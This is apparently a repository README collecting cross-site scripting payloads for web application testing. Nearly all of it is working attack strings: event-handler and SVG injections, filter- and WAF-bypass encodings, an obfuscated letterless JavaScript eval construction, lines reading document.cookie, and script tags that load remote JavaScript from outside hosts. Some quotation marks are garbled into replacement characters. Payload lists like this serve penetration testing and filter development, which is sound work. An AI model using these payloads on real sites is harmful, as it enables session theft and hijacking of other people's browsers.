# XSS-Payloads
XSS Payloads collection for testing web application during an engagement 

## Payloads for 2020 - Some updates
Extracted from https://netsec.expert/2020/02/01/xss-in-2020.html (Awesome work)

*SVG*
```javascript
<svg/onload=alert(1)><svg>
<svg
onload=alert(1)><svg> # newline char
<svg	onload=alert(1)><svg> # tab char
<svgonload=alert(1)><svg> # new page char (0xc)
```
*Standard HTML events*
```javascript
<body onload=alert()>
<img src=x onerror=alert()>
<svg onload=alert()>
<body onpageshow=alert(1)>
<div style="width:1000px;height:1000px" onmouseover=alert()></div>
<marquee width=10 loop=2 behavior="alternate" onbounce=alert()> (firefox only)
<marquee onstart=alert(1)> (firefox only)
<marquee loop=1 width=0 onfinish=alert(1)> (firefox only)
<input autofocus="" onfocus=alert(1)></input>
<details open ontoggle="alert()">  (chrome & opera only)
```
*Standard HTML events - Video load*
```javascript
<video autoplay onloadstart="alert()" src=x></video>
<video autoplay controls onplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<video controls onloadeddata="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<video controls onloadedmetadata="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<video controls onloadstart="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<video controls onloadstart="alert()"><source src=x></video>
<video controls oncanplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<audio autoplay controls onplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></audio>
<audio autoplay controls onplaying="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></audio>
```
*CSS-based events*
```javascript
<style>@keyframes x {}</style>
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>
```
*Weird XSS vectors*
```javascript
<svg><animate onbegin=alert() attributeName=x></svg>
<object data="data:text/html,<script>alert(5)</script>">
<iframe srcdoc="<svg onload=alert(4);>">
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
```


---
```javascript
By MrPapercut 
/**
* JS without english, slash, plus or minus
* (as extra challenge: no numbers or different-language characters either)

* First we need a few numbers
0: []<<[]
1: !!{}<<![]
2: !!{}<<!![]
3: (!![]<<!![])|!![]
4: !![]<<!![]<<!![]
5: !![]<<!![]<<!![]|!![]
6: !![]<<!![]<<!![]|!!{}<<!![]
14: !![]<<!![]<<!![]|!!{}<<!![]

* Next we need a few basic strings
false: `${!![][~[]]}`
true: `${![][~[]]}`
[object Object]: `${{}}`
undefined: `${[][~[]]}`

* Now we can build the string 'constructor'
{
c: `${{}}`[!![]<<!![]<<!![]|!![]],
o: `${{}}`[!!{}<<![]],
n: `${[][~[]]}`[!!{}<<![]],
s: `${!![][~[]]}`[(!![]<<!![])|!![]],
t: `${![][~[]]}`[!{}<<![]],
r: `${![][~[]]}`[!!{}<<![]],
u: `${![][~[]]}`[!!{}<<!![]],
c: `${{}}`[!![]<<!![]<<!![]|!![]],
t: `${![][~[]]}`[!{}<<![]],
o: `${{}}`[!!{}<<![]],
r: `${![][~[]]}`[!!{}<<![]]
}

* With 'constructor', we can create a function, like so:
[]['constructor']['constructor']('javascript code')()

* As JS code, we will run 'console.log("obfuscation!")'
* For a reason I can't be bothered about, it's easier to create 2 separate strings: "console['log']()" and "obfuscation!"
c ${`${{}}`[!![]<<!![]<<!![]|!![]]}
o ${`${{}}`[!!{}<<![]]}
n ${`${[][~[]]}`[!!{}<<![]]}
s ${`${!![][~[]]}`[(!![]<<!![])|!![]]}
o ${`${{}}`[!!{}<<![]]}
l ${`${!![][~[]]}`[!!{}<<!![]]}
e ${`${![][~[]]}`[(!![]<<!![])|!![]]}
[ ${`${{}}`[[]<<[]]}
'
l ${`${!![][~[]]}`[!!{}<<!![]]}
o ${`${{}}`[!!{}<<![]]}
g ${`${``[_]}`[!![]<<!![]<<!![]<<!![]^!![]<<!![]<<!![]|!!{}<<!![]]}
'
] ${`${{}}`[!![]<<!![]<<!![]<<!![]^!![]<<!![]<<!![]|!!{}<<!![]]}


o: `${{}}`[!!{}<<![]]
b: `${{}}`[!!{}<<!![]]
f: `${!![][~[]]}`[[]<<[]]
u: `${![][~[]]}`[!!{}<<!![]]
s: `${!![][~[]]}`[(!![]<<!![])|!![]]
c: `${{}}`[!![]<<!![]<<!![]|!![]]
a: `${!![][~[]]}`[!!{}<<![]]
t: `${![][~[]]}`[!{}<<![]]
i: `${[][~[]]}`[!![]<<!![]<<!![]|!![]]
o: `${{}}`[!!{}<<![]]
n: `${[][~[]]}`[!!{}<<![]]

// Assign 'constructor' to _
_=`${`${{}}`[!![]<<!![]<<!![]|!![]]}${`${{}}`[!!{}<<![]]}${`${[][~[]]}`[!!{}<<![]]}${`${!![][~[]]}`[(!![]<<!![])|!![]]}${`${![][~[]]}`[!{}<<![]]}${`${![][~[]]}`[!!{}<<![]]}${`${![][~[]]}`[!!{}<<!![]]}${`${{}}`[!![]<<!![]<<!![]|!![]]}${`${![][~[]]}`[!{}<<![]]}${`${{}}`[!!{}<<![]]}${`${![][~[]]}`[!!{}<<![]]}`;

// Assign 'obfuscation!' to __
__=`${`${{}}`[!!{}<<![]]}${`${{}}`[!!{}<<!![]]}${`${!![][~[]]}`[[]<<[]]}${`${![][~[]]}`[!!{}<<!![]]}${`${!![][~[]]}`[(!![]<<!![])|!![]]}${`${{}}`[!![]<<!![]<<!![]|!![]]}${`${!![][~[]]}`[!!{}<<![]]}${`${![][~[]]}`[!{}<<![]]}${`${[][~[]]}`[!![]<<!![]<<!![]|!![]]}${`${{}}`[!!{}<<![]]}${`${[][~[]]}`[!!{}<<![]]}!`;

// Execute
[][_][_](
`${`${{}}`[!![]<<!![]<<!![]|!![]]}${`${{}}`[!!{}<<![]]}${`${[][~[]]}`[!!{}<<![]]}${`${!![][~[]]}`[(!![]<<!![])|!![]]}${`${{}}`[!!{}<<![]]}${`${!![][~[]]}`[!!{}<<!![]]}${`${![][~[]]}`[(!![]<<!![])|!![]]}${`${{}}`[[]<<[]]}'${`${!![][~[]]}`[!!{}<<!![]]}${`${{}}`[!!{}<<![]]}${`${``[_]}`[!![]<<!![]<<!![]<<!![]^!![]<<!![]<<!![]|!!{}<<!![]]}'${`${{}}`[!![]<<!![]<<!![]<<!![]^!![]<<!![]<<!![]|!!{}<<!![]]}(__)`
)()

// All together now:
*/
_=`${`${{}}`[!![]<<!![]<<!![]|!![]]}${`${{}}`[!!{}<<![]]}${`${[][~[]]}`[!!{}<<![]]}${`${!![][~[]]}`[(!![]<<!![])|!![]]}${`${![][~[]]}`[!{}<<![]]}${`${![][~[]]}`[!!{}<<![]]}${`${![][~[]]}`[!!{}<<!![]]}${`${{}}`[!![]<<!![]<<!![]|!![]]}${`${![][~[]]}`[!{}<<![]]}${`${{}}`[!!{}<<![]]}${`${![][~[]]}`[!!{}<<![]]}`,__=`${`${{}}`[!!{}<<![]]}${`${{}}`[!!{}<<!![]]}${`${!![][~[]]}`[[]<<[]]}${`${![][~[]]}`[!!{}<<!![]]}${`${!![][~[]]}`[(!![]<<!![])|!![]]}${`${{}}`[!![]<<!![]<<!![]|!![]]}${`${!![][~[]]}`[!!{}<<![]]}${`${![][~[]]}`[!{}<<![]]}${`${[][~[]]}`[!![]<<!![]<<!![]|!![]]}${`${{}}`[!!{}<<![]]}${`${[][~[]]}`[!!{}<<![]]}!`,[][_][_](`${`${{}}`[!![]<<!![]<<!![]|!![]]}${`${{}}`[!!{}<<![]]}${`${[][~[]]}`[!!{}<<![]]}${`${!![][~[]]}`[(!![]<<!![])|!![]]}${`${{}}`[!!{}<<![]]}${`${!![][~[]]}`[!!{}<<!![]]}${`${![][~[]]}`[(!![]<<!![])|!![]]}${`${{}}`[[]<<[]]}'${`${!![][~[]]}`[!!{}<<!![]]}${`${{}}`[!!{}<<![]]}${`${``[_]}`[!![]<<!![]<<!![]<<!![]^!![]<<!![]<<!![]|!!{}<<!![]]}'${`${{}}`[!![]<<!![]<<!![]<<!![]^!![]<<!![]<<!![]|!!{}<<!![]]}(__)`)()

```



<b>Bypass WAF </b>
```javascript
</script><svg><script>alert(1)-%26apos%3B
anythinglr00</script><script>alert(document.domain)</script>uxldz

anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
<a href=javas&#99;ript:alert(1)>
```

<b>Payloads</b>
```javascript
<script>alert(123);</script>
<ScRipT>alert("XSS");</ScRipT>
<script>alert(123)</script>
<script>alert("hellox worldss");</script>
<script>alert(�XSS�)</script> 
<script>alert(�XSS�);</script>
<script>alert(�XSS�)</script>
�><script>alert(�XSS�)</script>
<script>alert(/XSS�)</script>
<script>alert(/XSS/)</script>
</script><script>alert(1)</script>
�; alert(1);
�)alert(1);//
<ScRiPt>alert(1)</sCriPt>
<IMG SRC=jAVasCrIPt:alert(�XSS�)>
<IMG SRC=�javascript:alert(�XSS�);�>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=javascript:alert(�XSS�)>      
<img src=xss onerror=alert(1)>


<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>

<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'

<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"

<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}

<img/src=`%00` onerror=this.onerror=confirm(1)

<form><isindex formaction="javascript&colon;confirm(1)"

<img src=`%00`&NewLine; onerror=alert(1)&NewLine;

<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>

<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?

<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">

<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/

&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00

<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">

<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>

<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script

<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}

<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>

<form><a href="javascript:\u0061lert&#x28;1&#x29;">X

</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>

<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a

http://www.google<script .com>alert(document.location)</script

<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a

<img/src=@&#32;&#13; onerror = prompt('&#49;')

<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;

<script ^__^>alert(String.fromCharCode(49))</script ^__^

</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(

&#00;</form><input type&#61;"date" onfocus="alert(1)">

<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>

<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/

<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>

<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>

<script ~~~>alert(0%0)</script ~~~>

<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>

<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN

<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)

&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'

&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}

<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^

<div/style="width:expression(confirm(1))">X</div> {IE7}

<iframe/%00/ src=javaSCRIPT&colon;alert(1)

//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//

/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>

//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\

</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>

<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">

</plaintext\></|\><plaintext/onmouseover=prompt(1)

</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}

<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>

<div onmouseover='alert&lpar;1&rpar;'>DIV</div>

<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">

<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>

<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">

<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">

<var onmouseover="prompt(1)">On Mouse Over</var>

<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>

<img src="/" =_=" title="onerror='prompt(1)'">

<%<!--'%><script>alert(1);</script -->

<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)

<iframe/onreadystatechange=alert(1)

<svg/onload=alert(1)

<input value=<><iframe/src=javascript:confirm(1)

<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>

http://www.<script>alert(1)</script .com

<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>

<svg><script ?>alert(1)

<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>

<img src=`xx:xx`onerror=alert(1)>

<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<math><a xlink:href="//jsfiddle.net/t846h/">click

<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
<svg contentScriptType=text/vbs><script>MsgBox+1

<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a

<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>

<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+

<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script

<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>

<script>+-+-1-+-+alert(1)</script>

<body/onload=&lt;!--&gt;&#10alert(1)>

<script itworksinallbrowsers>/*<script* */alert(1)</script

<img src ?itworksonchrome?\/onerror = alert(1)

<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)

<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe

<script x> alert(1) </script 1=2

<div/onmouseover='alert(1)'> style="x:">

<--`<img/src=` onerror=alert(1)> --!>
 <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>

<div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>

"><img src=x onerror=window.open('https://www.google.com/');>

<form><button formaction=javascript&colon;alert(1)>CLICKME

<math><a xlink:href="//jsfiddle.net/t846h/">click

<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>

<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>

<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>

<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
�;alert(String.fromCharCode(88,83,83))//�;alert(String.fromCharCode(88,83,83))//�;alert(String.fromCharCode(88,83,83))//�;alert(String.fromCharCode(88,83,83))//�></SCRIPT>�>�><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<IMG ���><SCRIPT>alert(�XSS�)</SCRIPT>�>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=�jav ascript:alert(�XSS�);�>
<IMG SRC=�jav&#x09;ascript:alert(�XSS�);�>
<<SCRIPT>alert(�XSS�);//<</SCRIPT>
%253cscript%253ealert(1)%253c/script%253e
�><s�%2b�cript>alert(document.cookie)</script>
foo<script>alert(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<BODY BACKGROUND=�javascript:alert(�XSS�)�>
<BODY ONLOAD=alert(�XSS�)>
<INPUT TYPE=�IMAGE� SRC=�javascript:alert(�XSS�);�>
<IMG SRC=�javascript:alert(�XSS�)�
<iframe src=http://ha.ckers.org/scriptlet.html <
javascript:alert("hellox worldss")
<img src="javascript:alert('XSS');">
<img src=javascript:alert(&quot;XSS&quot;)>
<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
<script>alert("hellox worldss")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
<script>alert("XSS");</script>&search=1
0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//";alert(String.fromCharCode?(88,83,83))//\";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search
<h1><font color=blue>hellox worldss</h1>
<BODY ONLOAD=alert('hellox worldss')>
<input onfocus=write(XSS) autofocus>
<input onblur=write(XSS) autofocus><input autofocus>
<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<form><button formaction="javascript:alert(XSS)">lol
<!--<img src="--><img src=x onerror=alert(XSS)//">
<![><img src="]><img src=x onerror=alert(XSS)//">
<style><img src="</style><img src=x onerror=alert(XSS)//">
<? foo="><script>alert(1)</script>">
<! foo="><script>alert(1)</script>">
</ foo="><script>alert(1)</script>">
<? foo="><x foo='?><script>alert(1)</script>'>">
<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
<% foo><x foo="%><script>alert(123)</script>">
<div style="font-family:'foo&#10;;color:red;';">LOL
LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
<script>({0:#0=alert/#0#/#0#(0)})</script>
<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(123)</script></svg>
&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;
\\";alert('XSS');//
&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;
&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;BODY ONLOAD=alert('XSS')&gt;
&lt;IMG DYNSRC=\"javascript&#058;alert('XSS')\"&gt;
&lt;IMG LOWSRC=\"javascript&#058;alert('XSS')\"&gt;
&lt;BGSOUND SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;BR SIZE=\"&{alert('XSS')}\"&gt;
&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;
&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('XSS');\"&gt;
&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;
&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;
&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\"&gt;
&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\")}&lt;/STYLE&gt;
&lt;XSS STYLE=\"behavior&#58; url(xss&#46;htc);\"&gt;
&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
&lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
&lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
�scriptualert(EXSSE)�/scriptu
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;alert('XSS');\"&gt;
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\"
&lt;IFRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/IFRAME&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/FRAMESET&gt;
&lt;TABLE BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
&lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;
&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
&lt;DIV STYLE=\"width&#58; expression(alert('XSS'));\"&gt;
&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\"XSS\")';&lt;/STYLE&gt;
&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(alert('XSS'))\"&gt;
&lt;XSS STYLE=\"xss&#58;expression(alert('XSS'))\"&gt;
exp/*&lt;A STYLE='no\xss&#58;noxss(\"*//*\");
xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;
&lt;STYLE TYPE=\"text/javascript\"&gt;alert('XSS');&lt;/STYLE&gt;
&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert('XSS')\")}&lt;/STYLE&gt;
&lt;!--&#91;if gte IE 4&#93;&gt;
&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
